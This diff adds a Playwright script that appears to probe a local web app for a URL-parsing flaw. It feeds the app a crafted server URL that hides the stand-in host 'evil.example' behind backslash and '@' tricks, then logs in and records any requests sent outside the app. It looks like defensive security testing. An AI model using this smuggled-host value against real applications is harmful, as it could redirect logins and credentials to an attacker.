@@ -1,0 +1,21 @@
+import { chromium } from 'playwright';
+const APP = 'http://127.0.0.1:8090/index.html';
+const url = 'https://evil.example\\@localhost:8787/';
+const browser = await chromium.launch();
+const ctx = await browser.newContext();
+const page = await ctx.newPage();
+const reqs = [];
+page.on('request', r => reqs.push(r.url()));
+await page.goto(APP + '#server=' + encodeURIComponent(url), { waitUntil: 'domcontentloaded' });
+await page.waitForTimeout(400);
+console.log('stored:', JSON.stringify(await page.evaluate(() => localStorage.getItem('clock_poc_server'))));
+console.log('toast:', await page.evaluate(() => [...document.querySelectorAll('#toasts .toast')].map(t => t.textContent)));
+// what the browser URL parser itself says:
+console.log('browser parse:', await page.evaluate((u) => { try { const x = new URL(u); return { href: x.href, host: x.host }; } catch (e) { return 'throw ' + e.message; } }, url));
+await page.fill('#password', 'password');
+await page.evaluate(() => localStorage.setItem('clock_poc_auth_ui', 'd'.repeat(64)));
+await page.click('#login-form button[type=submit]');
+await page.waitForTimeout(1500);
+console.log('login-msg:', await page.evaluate(() => document.querySelector('#login-msg').textContent));
+console.log('requests:', reqs.filter(u => !u.startsWith('http://127.0.0.1:8090')).join('\n'));
+await browser.close();
